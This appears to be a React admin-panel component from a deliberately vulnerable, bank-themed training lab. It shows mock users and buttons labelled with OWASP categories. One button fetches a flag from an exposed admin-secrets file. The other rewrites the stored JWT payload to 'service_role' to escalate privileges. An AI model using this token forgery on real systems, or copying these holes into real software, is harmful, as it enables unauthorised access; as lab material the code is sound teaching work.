import React, { useState } from 'react';

const AdminPanel = ({ user }) => {
  const [users, setUsers] = useState([
    { id: 1, email: 'cliente1@bbva.es', name: 'Juan Pérez', role: 'client', status: 'active' },
    { id: 2, email: 'cliente2@bbva.es', name: 'María García', role: 'client', status: 'active' },
    { id: 3, email: 'admin@bbva.es', name: 'Admin BBVA', role: 'service_role', status: 'active' }
  ]);

  const [flag, setFlag] = useState('');

  const getFlag = async () => {
    try {
      const response = await fetch('http://localhost:8001/public/admin-secrets/secrets.txt');
      const text = await response.text();
      setFlag(text);
    } catch (error) {
      setFlag('Error obteniendo flag: ' + error.message);
    }
  };

  return (
    <div className="admin-container">
      <h1>Panel de Administración</h1>
      
      <div className="admin-section">
        <h2>Usuarios del Sistema</h2>
        <table className="admin-table">
          <thead>
            <tr>
              <th>ID</th>
              <th>Email</th>
              <th>Nombre</th>
              <th>Rol</th>
              <th>Estado</th>
            </tr>
          </thead>
          <tbody>
            {users.map(u => (
              <tr key={u.id}>
                <td>{u.id}</td>
                <td>{u.email}</td>
                <td>{u.name}</td>
                <td>{u.role}</td>
                <td><span className="status-active">{u.status}</span></td>
              </tr>
            ))}
          </tbody>
        </table>
      </div>

      <div className="admin-section">
        <h2>Explotación de Vulnerabilidades</h2>
        <div className="exploit-buttons">
          <button className="btn-primary" onClick={getFlag}>
            Obtener Flag (A05)
          </button>
          <button className="btn-warning" onClick={() => {
            // Explotación A02: JWT débil
            const token = localStorage.getItem('jwt_token');
            if (token) {
              try {
                const parts = token.split('.');
                const payload = JSON.parse(atob(parts[1]));
                payload.role = 'service_role';
                parts[1] = btoa(JSON.stringify(payload));
                localStorage.setItem('jwt_token', parts.join('.'));
                alert('JWT modificado! Recarga la página.');
              } catch (e) {
                alert('Error modificando JWT: ' + e.message);
              }
            }
          }}>
            Modificar JWT (A02)
          </button>
        </div>
        
        {flag && (
          <div className="flag-container">
            <h3>Flag Obtenida:</h3>
            <div className="flag-content">{flag}</div>
          </div>
        )}
      </div>
    </div>
  );
};

export default AdminPanel;